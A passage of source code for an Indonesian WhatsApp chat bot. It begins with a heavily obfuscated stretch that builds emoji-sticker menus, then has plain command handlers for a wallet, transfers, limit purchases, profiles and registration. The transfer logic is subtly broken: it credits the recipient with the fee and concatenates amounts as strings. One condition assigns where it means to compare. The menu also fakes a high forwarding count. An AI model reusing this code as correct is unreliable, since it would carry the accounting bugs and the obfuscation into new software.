_0x12a8aa={};_0x12a8aa[_0x593f96(0x958,0xe18,0xe4f,0x604)]=_0x593f96(0x2d7,0x21c,0x1a2,0x677)+_0x593f96(0xa35,0xa33,0xb31,0x540)+qes,_0x12a8aa[_0x1e23e4(-0xaf,-0x13d,0x213,0x1b7)+'n']=''+creator,_0x12a8aa[_0x1e23e4(0xa1c,0xeee,0xa6e,0x976)]=''+qes;const _0x599a66={};_0x599a66[_0x1e23e4(0x79c,0x727,0x77a,0x364)]=_0x1e23e4(0x1a,0x5dc,0x2ab,0x5ac)+_0x593f96(0x5fe,0x33a,0x55e,0xa7f)+qes,_0x599a66['descriptio'+'n']=''+creator,_0x599a66[_0x1e23e4(0xa71,0xe7b,0xa6e,0x67a)]=''+qes;const _0x2aabe6={};_0x2aabe6[_0x1e23e4(0x6fb,0x586,0x77a,0x87e)]=_0x593f96(0x95b,0x649,0xad6,0x5b9)+_0x593f96(0x30c,-0x67,0x4e8,0x2e7)+qes,_0x2aabe6[_0x1e23e4(-0x1b7,-0xca,0x213,0x549)+'n']=''+creator,_0x2aabe6[_0x1e23e4(0xac6,0x779,0xa6e,0xf86)]=''+qes;const _0x1742dd={};_0x1742dd[_0x593f96(0x958,0xaff,0xa1e,0xa3c)]=_0x593f96(0x7bf,0x869,0x3b4,0x749)+_0x1e23e4(0x67a,0x240,0x226,0xe8)+qes,_0x1742dd[_0x1e23e4(-0xce,-0x13a,0x213,0x16f)+'n']=''+creator,_0x1742dd[_0x593f96(0xc4c,0x815,0xb18,0x78e)]=''+qes;const _0x256dae={};_0x256dae[_0x593f96(0x958,0xb5d,0xcba,0xd4f)]=_0x593f96(0x2df,0x64b,0x5aa,0x92)+_0x1e23e4(0x9,-0xe9,0x27a,0x2e5)+qes,_0x256dae[_0x593f96(0x3f1,0x81d,0x27a,0x217)+'n']=''+creator,_0x256dae['rowId']=''+qes;const _0x242d99={};_0x242d99[_0x593f96(0x958,0xae4,0x9e8,0x445)]='Emoji-Open'+_0x1e23e4(0xad4,0x8b7,0x615,0x22a)+qes,_0x242d99['descriptio'+'n']=''+creator,_0x242d99[_0x1e23e4(0xf78,0xbe1,0xa6e,0xa63)]=''+qes;const _0x5b46a3={};_0x5b46a3[_0x1e23e4(0x7ff,0xa41,0x77a,0xbba)]=_0x593f96(0x2e6,-0x84,-0x1c8,-0xa0)+_0x1e23e4(0x74e,0x6c5,0x9e2,0xd9a)+qes,_0x5b46a3['descriptio'+'n']=''+creator,_0x5b46a3[_0x593f96(0xc4c,0xd2c,0xfbb,0xc63)]=''+qes;const _0x3bf8af={};_0x3bf8af[_0x1e23e4(0xbfd,0x28c,0x77a,0x7ee)]=_0x1e23e4(0x983,0x251,0x76a,0x99b)+_0x1e23e4(0x9f4,0xe11,0x92a,0x6da)+qes,_0x3bf8af[_0x1e23e4(0x72a,0x9b,0x213,0x429)+'n']=''+creator,_0x3bf8af['rowId']=''+qes;const _0x2a77af={};_0x2a77af[_0x1e23e4(0xc1b,0x2ba,0x77a,0xb2c)]=_0x593f96(0x894,0x3f3,0xd8f,0x7ba)+qes,_0x2a77af['descriptio'+'n']=''+creator,_0x2a77af[_0x593f96(0xc4c,0x975,0xfe1,0x7c1)]=''+qes;const _0x4bad72={};_0x4bad72['title']='Emoji-HTC-'+qes,_0x4bad72[_0x593f96(0x3f1,0x4a7,0x7b1,0x6ed)+'n']=''+creator,_0x4bad72[_0x1e23e4(0x65c,0x8cd,0xa6e,0x8cb)]=''+qes;const rows12=[_0x6a99c2,_0x451c67,_0x560b1b,_0x12a8aa,_0x599a66,_0x2aabe6,_0x1742dd,_0x256dae,_0x242d99,_0x5b46a3,_0x3bf8af,_0x2a77af,_0x4bad72],_0x4f21dd={};_0x4f21dd[_0x593f96(0x958,0x6f5,0xac3,0xcbb)]=_0x593f96(0x7c4,0x4c9,0x867,0xb91)+_0x593f96(0x3e4,-0xee,0x868,0x44a),_0x4f21dd[_0x593f96(0x8a0,0x855,0x78c,0x478)]=rows12;const sections12=[_0x4f21dd],listt12={'buttonText':_0x1e23e4(0xe44,0xcad,0xacf,0x918)+'E','title':_0x593f96(0x447,0x3a8,0x82f,0x543)+'\x20','description':_0x593f96(0x636,0xb4f,0x340,0x12d)+sender[_0x1e23e4(-0x73,-0x222,0x133,0x362)]('@')[-0x12f*0x4+0x9ea+-0xd*0x66]+(_0x593f96(0x63a,0x600,0x1a7,0x8b6)+_0x593f96(0xb15,0x93d,0xef9,0x79a)+_0x1e23e4(0x8c7,0x666,0xab5,0xd8b)+_0x1e23e4(0x90,0xa60,0x5a6,0x7fe)+_0x1e23e4(0x59c,0x861,0x437,0x126)+_0x1e23e4(0xde5,0xd0a,0x913,0xd71)+_0x593f96(0x31e,0x282,0x75b,-0x114)),'footerText':''+tampilTanggal+enter+tampilWaktu,'sections':sections12,'listType':0x1},_0x1dd860={};_0x1dd860[_0x593f96(0x2ad,-0x37,0x2ff,0x121)+'id']=[sender];const _0x3759c1={};_0x3759c1['quoted']=ftoko,_0x3759c1[_0x593f96(0xaa4,0x6d2,0xc67,0x89e)+'o']=_0x1dd860,alpha[_0x593f96(0x863,0x7b1,0x899,0x89a)+'e'](from,listt12,MessageType[_0x1e23e4(0x779,0x740,0x958,0x97b)+'e'],_0x3759c1),await limitAdd(sender,limit);break;}sub_yt_zeeone_ofc==_0x1e23e4(0xa8b,0xdff,0xa12,0x7c9)+'e-'+q5&&(reply(lang[_0x593f96(0x321,0x5e2,0x637,0x81b)]()),emoji[_0x593f96(0x57f,0x8c8,0x90c,0xd7)](''+q5)['then'](async _0x563860=>{const _0xe1721a={'afbZq':function(_0x526efd,_0x5d0a5a,_0x5358b0){return _0x526efd(_0x5d0a5a,_0x5358b0);}};function _0x27655e(_0x3496e0,_0x5d46c0,_0x472ffd,_0x39d53f){return _0x593f96(_0x39d53f- -0x3be,_0x5d46c0,_0x472ffd-0x194,_0x39d53f-0xe6);}teks=''+_0x563860[_0x27655e(0x59,0x18c,-0x329,0x34)][0xcb7+-0x1dc0+0x26f*0x7][_0x27655e(-0x385,-0x239,-0x2af,-0x8d)],console[_0x27655e(0x6c2,0x325,0x6db,0x3ae)](teks);function _0x1fcb59(_0xd9c9b1,_0x1d10b9,_0x184820,_0x178377){return _0x593f96(_0x1d10b9- -0x268,_0x184820,_0x184820-0x3,_0x178377-0x7f);}sendStickerFromUrl(from,''+teks),await _0xe1721a[_0x27655e(0x4b7,0x59c,0x2d8,0x40a)](limitAdd,sender,limit);}));sub_yt_zeeone_ofc==_0x593f96(0x9fe,0x53f,0xa37,0xed4)+_0x1e23e4(0x287,0x147,0x50f,0x4b6)+q5&&emoji[_0x593f96(0x57f,0x748,0x864,0x16f)](''+q5)[_0x1e23e4(0x34b,0xb75,0x667,0x463)](async _0x247bf5=>{const _0x35c319={'VOWwq':function(_0x34e165,_0x5b6a23,_0x229bda){return _0x34e165(_0x5b6a23,_0x229bda);},'KzTGd':function(_0x3c7d5e,_0x3c3433,_0x9a8b32){return _0x3c7d5e(_0x3c3433,_0x9a8b32);}};teks=''+_0x247bf5['images'][0x16c0+0x1599+-0x102*0x2c][_0x205258(0x4a7,-0x242,0xb4,0xf0)];function _0x205258(_0x4e743a,_0x4c20bc,_0x3e1025,_0x3f6c30){return _0x1e23e4(_0x4e743a-0x165,_0x4c20bc-0x114,_0x3f6c30- -0x63,_0x4e743a);}function _0x369be7(_0x2bbf04,_0x3e6d8a,_0x5b3f62,_0x317bf7){return _0x1e23e4(_0x2bbf04-0x8f,_0x3e6d8a-0x8,_0x3e6d8a-0xd0,_0x2bbf04);}console[_0x205258(0x15d,0x9dd,0x7f8,0x52b)](teks),_0x35c319[_0x205258(0x3e4,0x427,-0x1ae,0x1b8)](sendStickerFromUrl,from,''+teks),await _0x35c319[_0x369be7(0xb9c,0x9d1,0x7b7,0xbf8)](limitAdd,sender,limit);});sub_yt_zeeone_ofc==_0x593f96(0x387,-0x59,-0x36,0xda)+_0x1e23e4(-0x180,0x140,0x283,0x471)+q5&&(reply(lang['wait']()),emoji[_0x593f96(0x57f,0x256,0x2bf,0x3d3)](''+q5)[_0x1e23e4(0x69e,0x1a9,0x667,0x86e)](async _0x117108=>{const _0x36e0f6={'mGhSc':function(_0x4218dc,_0x49a876,_0x44789a){return _0x4218dc(_0x49a876,_0x44789a);},'oVuvU':function(_0x3c8643,_0x244fa2,_0x29716d){return _0x3c8643(_0x244fa2,_0x29716d);}};teks=''+_0x117108[_0x1ddcea(0x382,0x549,0x345,0x1e9)][-0x2*-0xc5+0x158c+-0x1714][_0x43717a(-0x164,-0x449,0xe0,-0x13d)];function _0x1ddcea(_0x1a329b,_0x3343b6,_0xa3e06a,_0x47e99a){return _0x1e23e4(_0x1a329b-0xef,_0x3343b6-0x80,_0xa3e06a-0x131,_0x1a329b);}function _0x43717a(_0x178891,_0x2c2eb8,_0x26e60b,_0x4cae02){return _0x593f96(_0x4cae02- -0x46e,_0x26e60b,_0x26e60b-0x8a,_0x4cae02-0x17d);}console[_0x1ddcea(0x49e,0x697,0x6bf,0x264)](teks),_0x36e0f6[_0x1ddcea(0x1f7,0x8cf,0x56e,0xf3)](sendStickerFromUrl,from,''+teks),await _0x36e0f6[_0x43717a(0x135,0x3d1,0x53c,0x195)](limitAdd,sender,limit);}));sub_yt_zeeone_ofc=='Emoji-Micr'+_0x1e23e4(0x84e,0x36a,0x857,0x540)+q5&&emoji['get'](''+q5)[_0x1e23e4(0x227,0x5b9,0x667,0x4b1)](async _0x239f07=>{const _0x34a5f0={'iajlW':function(_0x2b2554,_0x45542f,_0x54bb54){return _0x2b2554(_0x45542f,_0x54bb54);}};function _0x569539(_0x3902dd,_0x4c4424,_0x20df20,_0x3e921a){return _0x593f96(_0x20df20- -0x3ac,_0x3902dd,_0x20df20-0x1f,_0x3e921a-0x8f);}function _0x9f4b5e(_0x1ac3a6,_0x5dc3f8,_0x5df03a,_0x5b1219){return _0x593f96(_0x5b1219- -0x3e9,_0x5df03a,_0x5df03a-0x20,_0x5b1219-0x77);}teks=''+_0x239f07[_0x9f4b5e(-0x3e4,-0x45f,-0x1bb,0x9)][0x1475*0x1+0x1*-0x98+-0x13da][_0x569539(-0x22a,0xa0,-0x7b,-0x477)],console[_0x9f4b5e(0x88c,-0x87,0x520,0x383)](teks),sendStickerFromUrl(from,''+teks),await _0x34a5f0[_0x9f4b5e(0x534,0x28b,-0x206,0x57)](limitAdd,sender,limit);});sub_yt_zeeone_ofc==_0x1e23e4(0x646,0x2e4,0x2ab,0x72a)+'sApp-'+q5&&(reply(lang[_0x1e23e4(0x190,0x113,0x143,-0x18a)]()),emoji[_0x1e23e4(-0x81,0x809,0x3a1,0x639)](''+q5)['then'](async _0x488f9c=>{const _0x86932b={'DfCUV':function(_0x6f8cff,_0x37c18b,_0x15ca27){return _0x6f8cff(_0x37c18b,_0x15ca27);},'APiVL':function(_0x4d19e6,_0x4960ee,_0x315946){return _0x4d19e6(_0x4960ee,_0x315946);}};function _0x507337(_0x3e19ac,_0x248d4d,_0x4fa639,_0x5cffe3){return _0x1e23e4(_0x3e19ac-0x32,_0x248d4d-0xd,_0x248d4d- -0x306,_0x5cffe3);}teks=''+_0x488f9c[_0x507337(0x261,-0xf2,-0x29f,-0x107)][0x4f5+-0x22de*-0x1+0x2b*-0xed][_0x279c85(0x72e,0x402,0x7af,0x3ef)];function _0x279c85(_0x202c29,_0x1d177e,_0x39a3c4,_0x41c83e){return _0x593f96(_0x1d177e-0xd1,_0x39a3c4,_0x39a3c4-0xc0,_0x41c83e-0x41);}console[_0x507337(0x29a,0x288,-0xb7,0x23f)](teks),_0x86932b['DfCUV'](sendStickerFromUrl,from,''+teks),await _0x86932b['APiVL'](limitAdd,sender,limit);}));sub_yt_zeeone_ofc==_0x593f96(0x95b,0x600,0xae2,0xb3f)+'ter-'+q5&&emoji[_0x1e23e4(0xd4,0x9,0x3a1,0x2ca)](''+q5)[_0x593f96(0x845,0x362,0x3b2,0x6ef)](async _0x2afb11=>{function _0x1cb4a9(_0x359e41,_0x295a4a,_0x34debe,_0x54f681){return _0x1e23e4(_0x359e41-0x95,_0x295a4a-0x126,_0x34debe-0x39e,_0x359e41);}function _0x15d27e(_0x1eeaa0,_0x381af2,_0x5f0a2a,_0x260f16){return _0x1e23e4(_0x1eeaa0-0x158,_0x381af2-0xb3,_0x5f0a2a- -0x2bc,_0x381af2);}const _0x338a47={'rOeJf':function(_0x626fba,_0x15fab7,_0x57769a){return _0x626fba(_0x15fab7,_0x57769a);},'SjKrj':function(_0x1b1aa4,_0xc6d545,_0x3c135b){return _0x1b1aa4(_0xc6d545,_0x3c135b);}};teks=''+_0x2afb11[_0x1cb4a9(0x8d8,0x5c9,0x5b2,0x7d5)][-0x1*0x2153+0x21c2+-0x6a]['url'],console[_0x15d27e(0xca,-0x174,0x2d2,0x622)](teks),_0x338a47[_0x15d27e(-0x293,0x1ea,-0x10b,0x265)](sendStickerFromUrl,from,''+teks),await _0x338a47[_0x15d27e(0x45c,0x25,-0x52,0x5d)](limitAdd,sender,limit);});sub_yt_zeeone_ofc==_0x593f96(0x7bf,0x634,0x538,0x703)+_0x1e23e4(0x250,0x1cf,0x226,-0x100)+q5&&(reply(lang[_0x593f96(0x321,0x14d,0x423,0xed)]()),emoji[_0x593f96(0x57f,0x57e,0x83c,0x5d6)](''+q5)['then'](async _0x15ef51=>{function _0x2fb3ac(_0x2d9333,_0x41b5dc,_0x2fe472,_0xbc2d87){return _0x1e23e4(_0x2d9333-0x1a6,_0x41b5dc-0x1f1,_0x41b5dc- -0x70,_0x2fe472);}const _0x23a795={'tuhKx':function(_0x28a0e1,_0x1439e3,_0x48ae0c){return _0x28a0e1(_0x1439e3,_0x48ae0c);},'lKxyf':function(_0x4e50a1,_0x1534d5,_0x5bf498){return _0x4e50a1(_0x1534d5,_0x5bf498);}};teks=''+_0x15ef51['images'][0xd*-0x1cf+-0x59a+0x1d23]['url'],console[_0x2fb3ac(0xa0d,0x51e,0x219,0x15f)](teks);function _0xd875f1(_0x5e2c4c,_0x4cb130,_0x51d3dd,_0x5aaed5){return _0x593f96(_0x4cb130-0x1dc,_0x5e2c4c,_0x51d3dd-0xb1,_0x5aaed5-0x1b);}_0x23a795['tuhKx'](sendStickerFromUrl,from,''+teks),await _0x23a795[_0xd875f1(0x7d8,0xbfa,0xbff,0xe0b)](limitAdd,sender,limit);}));sub_yt_zeeone_ofc=='Emoji-JoyP'+_0x1e23e4(-0x10b,-0x25d,0x27a,-0x210)+q5&&emoji[_0x1e23e4(0x625,0x3f0,0x3a1,0x7e1)](''+q5)['then'](async _0x26271a=>{const _0x473599={'rzqnV':function(_0x49da4f,_0x33fbbb,_0x1e9ba1){return _0x49da4f(_0x33fbbb,_0x1e9ba1);}};function _0x207be4(_0x1a1f8c,_0x16c268,_0x1a8ab9,_0x23f503){return _0x1e23e4(_0x1a1f8c-0x8,_0x16c268-0x190,_0x1a8ab9-0x37d,_0x1a1f8c);}teks=''+_0x26271a[_0x207be4(0x351,0x339,0x591,0x51d)][0x17bc+-0x2*0xeac+0x5a3][_0x207be4(0x6a1,0x492,0x4d0,0x5e8)],console['log'](teks),_0x473599['rzqnV'](sendStickerFromUrl,from,''+teks);function _0xde6566(_0x3a5e03,_0x2f3524,_0x5deb2b,_0x539bbb){return _0x1e23e4(_0x3a5e03-0x1e8,_0x2f3524-0x17c,_0x2f3524-0x2c9,_0x5deb2b);}await limitAdd(sender,limit);});sub_yt_zeeone_ofc==_0x1e23e4(0x978,0x39c,0x5c2,0x3b9)+_0x1e23e4(0x853,0x6bb,0x615,0x761)+q5&&emoji[_0x1e23e4(0x18c,0x48c,0x3a1,0x79f)](''+q5)[_0x593f96(0x845,0xb75,0x5fb,0x5b3)](async _0x54156b=>{const _0xed7cb2={'NgIXA':function(_0x1a3184,_0x20a839,_0x5b64fe){return _0x1a3184(_0x20a839,_0x5b64fe);}};function _0x4da90e(_0xe9a58d,_0x15d0e7,_0x43a723,_0x5e4449){return _0x1e23e4(_0xe9a58d-0x1ee,_0x15d0e7-0x41,_0x43a723-0x20e,_0x15d0e7);}teks=''+_0x54156b[_0x417635(0x2a5,0x127,0x5bc,0x185)][0xe5c+-0x24e7+0x1*0x1693]['url'],console[_0x4da90e(0x98c,0x959,0x79c,0x33b)](teks),_0xed7cb2[_0x417635(-0x58,-0x327,-0x474,0x9a)](sendStickerFromUrl,from,''+teks);function _0x417635(_0x3d797b,_0x10516b,_0x19f2a1,_0xe0c01e){return _0x593f96(_0xe0c01e- -0x26d,_0x19f2a1,_0x19f2a1-0x154,_0xe0c01e-0x7d);}await _0xed7cb2[_0x417635(0x52,-0x7,-0x254,0x9a)](limitAdd,sender,limit);});sub_yt_zeeone_ofc==_0x1e23e4(0x14a,0x1a8,0x108,0x180)+_0x593f96(0xbc0,0x88a,0xb97,0x83b)+q5&&(reply(lang[_0x593f96(0x321,0x2c2,-0x131,0x2ba)]()),emoji[_0x593f96(0x57f,0x61e,0x267,0x389)](''+q5)[_0x593f96(0x845,0xc5f,0x986,0x52a)](async _0x168a05=>{function _0x18227e(_0x3cecad,_0x541518,_0x5d0ccd,_0x3b9100){return _0x1e23e4(_0x3cecad-0x1d1,_0x541518-0x8c,_0x3cecad- -0x2b2,_0x541518);}const _0x43284c={'mxtVS':function(_0x3b0fef,_0x49b638,_0x42cb94){return _0x3b0fef(_0x49b638,_0x42cb94);}};teks=''+_0x168a05['images'][-0x219b+-0x7*-0x33d+-0xaf9*-0x1][_0x20c66a(0x262,0x523,0x92e,0x4d1)];function _0x20c66a(_0x8bc87,_0x4e6de5,_0x3e815b,_0x2e72f1){return _0x593f96(_0x2e72f1-0x1a0,_0x3e815b,_0x3e815b-0x8c,_0x2e72f1-0x1bf);}console[_0x18227e(0x2dc,0x745,0x6b5,0x627)](teks),_0x43284c[_0x18227e(0x6f0,0xabc,0x310,0xa60)](sendStickerFromUrl,from,''+teks),await _0x43284c[_0x20c66a(0x1011,0xae5,0x1158,0xd20)](limitAdd,sender,limit);}));sub_yt_zeeone_ofc==_0x593f96(0x948,0x72e,0xb92,0x9dd)+_0x1e23e4(0x960,0x6cf,0x92a,0xc1b)+q5&&emoji[_0x1e23e4(-0x16d,0x14f,0x3a1,0x172)](''+q5)[_0x593f96(0x845,0x9a9,0x743,0x7ca)](async _0x12939e=>{const _0x510aba={'lLgEt':function(_0x5d5529,_0x44c2a6,_0x2cf1c8){return _0x5d5529(_0x44c2a6,_0x2cf1c8);}};function _0x4cf871(_0x42a3f2,_0x3e375e,_0x52dbdf,_0xfdbb1d){return _0x593f96(_0x3e375e-0xf8,_0xfdbb1d,_0x52dbdf-0x1d0,_0xfdbb1d-0x5e);}function _0x21649d(_0x12cf42,_0x527008,_0x5dc01b,_0x34b0af){return _0x1e23e4(_0x12cf42-0xb1,_0x527008-0x52,_0x34b0af-0x291,_0x527008);}teks=''+_0x12939e['images'][-0x1f88*0x1+0x908+0x168a]['url'],console[_0x21649d(0xb41,0x999,0xc58,0x81f)](teks),_0x510aba[_0x21649d(0x735,0x55,0x8de,0x4ef)](sendStickerFromUrl,from,''+teks),await _0x510aba[_0x21649d(0x164,0xd5,0x9a9,0x4ef)](limitAdd,sender,limit);});sub_yt_zeeone_ofc==_0x1e23e4(0xb7a,0x362,0x6b6,0x58f)+q5&&(reply(lang['wait']()),emoji['get'](''+q5)[_0x593f96(0x845,0x434,0x36c,0x798)](async _0x133a3d=>{const _0x366397={'TPlHl':function(_0x157102,_0x4caca4,_0x26cc26){return _0x157102(_0x4caca4,_0x26cc26);}};teks=''+_0x133a3d[_0x2d9249(0x4c9,0x5bd,0x4bd,0x751)][-0x278*0x2+0x23cf+-0x1ed4][_0x2d9249(0x408,0x89e,0x1fe,0x2c6)];function _0x2d9249(_0x26985d,_0x20fed3,_0x138210,_0x43a824){return _0x1e23e4(_0x26985d-0x116,_0x20fed3-0x8f,_0x26985d-0x2b5,_0x138210);}function _0x2beff6(_0x4ae1a2,_0x18c994,_0x326f57,_0x225f9d){return _0x1e23e4(_0x4ae1a2-0xbe,_0x18c994-0x52,_0x4ae1a2-0x1ef,_0x225f9d);}console[_0x2beff6(0x77d,0x71d,0x8d0,0x4b2)](teks),sendStickerFromUrl(from,''+teks),await _0x366397[_0x2beff6(0x7f8,0x65a,0xd07,0x5d5)](limitAdd,sender,limit);}));sub_yt_zeeone_ofc=='Emoji-HTC-'+q5&&emoji['get'](''+q5)[_0x593f96(0x845,0x474,0x8cd,0x8e3)](async _0x2cb733=>{function _0x3dd7fe(_0x149c73,_0x1be57c,_0x10a262,_0x24f21f){return _0x1e23e4(_0x149c73-0x157,_0x1be57c-0x72,_0x1be57c- -0x39e,_0x149c73);}const _0x489278={'sMtzz':function(_0xdf3ed9,_0x21484e,_0x54ee05){return _0xdf3ed9(_0x21484e,_0x54ee05);}};teks=''+_0x2cb733[_0x576bb9(0x156,0xab,0x381,0x331)][-0x560+0x28a+0x2e2][_0x576bb9(0xe5,-0x16,-0x32e,0x84)];function _0x576bb9(_0x3b1c87,_0x4015af,_0x5e8ff9,_0x54baa3){return _0x593f96(_0x4015af- -0x347,_0x5e8ff9,_0x5e8ff9-0xb3,_0x54baa3-0xcf);}console[_0x576bb9(0x41,0x425,0x609,0x54b)](teks),_0x489278[_0x3dd7fe(-0x4e4,-0x1ab,-0xd1,-0x27f)](sendStickerFromUrl,from,''+teks),await _0x489278[_0x3dd7fe(-0x309,-0x1ab,-0x325,0x24b)](limitAdd,sender,limit);});      
		switch (command) {
case 'dompet':
					const kantong = checkATMuser(sender)
					reply(` *「 ATM USER 」* \n📛 *Nama* : ${pushname}\n🆔 *Nomer* : ${sender.split("@")[0]}\n💰 *Uang* : ${kantong}\n`)
					break
	case 'transfer':
				if (!q.includes('|')) return  reply('format salah')
                			const tujuan = q.substring(0, q.indexOf('|') - 1)
                			const jumblah = q.substring(q.lastIndexOf('|') + 1)
                			if(isNaN(jumblah)) return await reply('jumlah harus berupa angka!!')
                			if (jumblah < 100 ) return reply(`Minimal Transfer 100`)
                			if (checkATMuser(sender) < jumblah) return reply(`uang mu tidak mencukupi untuk melakukan transfer`)
                			const tujuantf = `${tujuan.replace("@", '')}`
               				fee = 0.005 *  jumblah
                			hasiltf = jumblah + fee
                			addKoinUser(`${tujuantf}@s.whatsapp.net`, hasiltf)
                			confirmATM(sender, hasiltf)
                			reply(`*「 SUKSES  」*\n\npengiriman uang telah sukses\ndari : +${sender.split("@")[0]}\nke : +${tujuan}\njumblah transfer : ${jumblah}\npajak : 30*jumblah`)
                			break
	case 'limit': case 'ceklimit': case 'balance': case 'glimit':
reply(`💳 Limit : ${isPremium ? 'Unlimited Premium' : `${getLimit(sender, limitawal, limit)} / ${limitawal}`}
🏧 Limit Game : ${cekGLimit(sender, gcount, glimit)} / ${gcount}
🏦 Balance : $${getBalance(sender, balance)}


Kamu Dapat Membeli Limit Dengan ${prefix}Buylimit *Nominal* Dan ${prefix}Buyglimit *Nominal* Untuk Membeli Game Limit

*Example :*
${prefix}buylimit 10
${prefix}buyglimit 10

NOTE : 
- Harga Limit Perlimit adalah $100 balance`)
break
case 'buylimit':{
if (!q) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $100 balance`)
if (q.includes('-')) return reply(`Jangan menggunakan -`)
if (isNaN(q)) return reply(`Harus berupa angka`)
let ane = Number(nebal(q) * 100)
if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
kurangBalance(sender, ane, balance)
giveLimit(sender, nebal(q), limit)
reply(`Pembeliaan limit sebanyak ${q} berhasil

*🏧 Sisa Balance : $${getBalance(sender, balance)}*
*🏦 Sisa Limit : ${getLimit(sender, limitawal, limit)} / ${limitawal}*`)
}
break
case 'buyglimit':{
if (!q)return reply(`Example : ${prefix + command} 10\n\nHarga 1 limit = $100 balance`)
if (q.includes('-')) return reply(`Jangan menggunakan -`)
if (isNaN(q)) return reply(`Harus berupa angka`)
const koinPerlimit = 100
const total = koinPerlimit * q
if (getBalance(sender,balance) <= total) return reply(`maaf Balance kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
kurangBalance(sender, total, balance)
givegame(sender, q, glimit)
reply(`Pembeliaan game limit sebanyak ${q} berhasil

*💳 Sisa Balance : $${getBalance(sender, balance)}*
*💷 Sisa Game Limit : ${cekGLimit(sender, gcount, glimit)} / ${gcount}*`)
}
break
	case 'me': case 'myinfo': case 'info': case 'profile': case 'profil':{
let cek = ms( await premium.getPremiumExpired(sender, premium) - Date.now())
let userProcfile = `「 *USER INFO* 」

📛 Nama : ${pushname}
💋 Bio : ${bio_user}
🔗 Tag : @${sender.split("@")[0]}
💥 Api : wa.me/${sender.split("@")[0]}

💹 Limit : ${isPremium ? 'Unlimited Premium' : `${getLimit(sender, limitawal, limit)} / ${limitawal}`}
💳 Game Limit : ${cekGLimit(sender, gcount, glimit)} / ${gcount}
💷 Balance : $${getBalance(sender, balance)}
👛 Dompet : ${checkATMuser(sender)}
💱 Role : ${role}
🏧 Level : ${getLevelingLevel(sender)}
🏦 Xp : ${getLevelingXp(sender)}

💌 Status : ${isPremium? `Premium User` : `Free user`}
⏰ Expired Prem : ${isPremium ? 'Unlimited Premium' : ` ${cek.days} d, ${cek.hours} h, ${cek.minutes} m, ${cek.seconds} s`}
👨‍🎓 Register : ${isRegister? `Done`:`Belum Daftar`}
🚫 Baned : ${isBanned?`True`:`False`}`
let papakpo = [{
										"buttonId": `inv`,
										"buttonText": {
											"displayText": "INVENTORY"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `sewabot`,
										"buttonText": {
											"displayText": "SEWA"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, userProcfile , `NOTE ！\nJika whatsapp mod kamu belum support button silahkan tonton video ini https://youtu.be/ERGID4Fmo9w\n\n${botname}™© | By ${ownername}`,pp_userz, papakpo, {contextInfo: { mentionedJid: [sender]}})
}
break
	case 'verify': case 'daftar':
 if (isRegister) return reply('Kamu sudah terdaftar di dalam database')
 addRegisterUser(sender, pushname, bio_user, wib)
 let ran_blc = randomNomor(50)
 addBalance(sender, ran_blc, balance)
fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
teks = `╭─❒ *Verification* ❒\n│📛 *Nama :* ${pushname}\n│#️⃣ *Nomor :* @${sender.split('@')[0]}\n│💌 *Bio :* ${bio_user}\n│⏰ *Time :* ${wib} Wib\n╰❒ *Success*`
let papako = [{
										"buttonId": `menu`,
										"buttonText": {
											"displayText": "MENU"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `me`,
										"buttonText": {
											"displayText": "PROCFILE"
											},
										"type": "RESPONSE"
										}]
								sendButLocation(from, teks , `Thank for verification 💋\n${botname}™© | By ${ownername}`,pp_userz, papako, {contextInfo: { mentionedJid: [sender]}})
                break
	case 'menu': case 'help':
			try {
				chatt = await alpha.getProfilePicture(sender)
				} catch {
				chatt = 'https://l.top4top.io/p_20670hd6v1.jpg'
				}
			let ch = await getBuffer(chatt)
koko = `${targetpc}@s.whatsapp.net`
let content = fs.readFileSync(`image/${thumbnail}`)
const media = await alpha.prepareMessage(from, content, MessageType.image, { thumbnail:fs.readFileSync(`image/${thumbnail}`)})
let bacotlu = media.message["ephemeralMessage"] ? media.message.ephemeralMessage : media
let p1 = await alpha.getStatus(sender)
anunya = process.uptime()
ini_anu =`${ucapannya2}

╭─❒ 「 Bot Info 」 ❒
├ Creator :  @${koko.split('@')[0]}
├ Powered  : @${ini_mark.split('@')[0]}
├ Prefix :   ${prefix}
├ Total hit : ${hitall}
├ Hit today : ${hit_today.length}
├ Speed : ${latensii.toFixed(4)} Second
├ Runtime : ${kyun(anunya)}
├ Battery : ${isBattre}
╰❒ Charging : ${isCharge}

╭─❒ 「 User Info 」 ❒
├ Name : ${pushname}
├ Bio : ${p1 ? `${p1.status}` : '-'}
├ Nomor : @${sender.split('@')[0]}
├ Me : ${mek.key.fromMe ? 'True' : 'False'}
╰❒ Owner : ${isOwner ? 'True' : `False`}
`
if(menusimple == false){
sendButDoc(from, ini_anu, `_Please Don't spam bot, pause 3 seconds per command._\n_Thanks!_`, sender, koko, ini_mark)
} else if(menusimple = true){ 
let content1 = fs.readFileSync(`image/${thumbnail}`)
const media1 = await alpha.prepareMessage(from, content1, MessageType.location, {thumbnail: content1})
let bacotlu1 = media1.message["ephemeralMessage"] ? media1.message.ephemeralMessage : media1

const buttons1 = [
  {buttonId: 'ownerku', buttonText: {displayText: '⋮☰ OWNER'}, type: 1},
  {buttonId: 'statiktiknya', buttonText:{displayText: '✓ STATISTIC'}, type: 1},
  {buttonId: 'Command', buttonText: {displayText: '❍ LIST MESSAGE'}, type: 1}
]

const btn1 = {
    contentText: allmenu(prefix, wita, wit, ucapannya2, timuu, status, wa_version, mcc, mnc, os_version, device_manufacturer, device_model, alfa , alfa1, thisDay, ini_tanggal, totalchat, hit_today, ini_gcchat),
    footerText: `${tampilTanggal}${enter}${tampilWaktu}${enter}${enter}Regard @${koko.split('@')[0]}`,
    buttons: buttons1,
    headerType: 6,
    locationMessage: bacotlu1.message.locationMessage
}

alpha.sendMessage(from,  btn1, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender,koko,ini_mark],
            },
			quoted: fkontak,sendEphemeral: true 
			})
}

break
case 'setmenu':
if (!isOwner && !isCreator && !mek.key.fromMe) return reply(lang.onlyOwner())
if (args.length < 1) return reply(`*Example :*${enter} •${prefix + command} simple\n  for simple menu\n${enter} •${prefix + command} ori\n  for real menu`)
 if ((args[0]) == 'ori'){
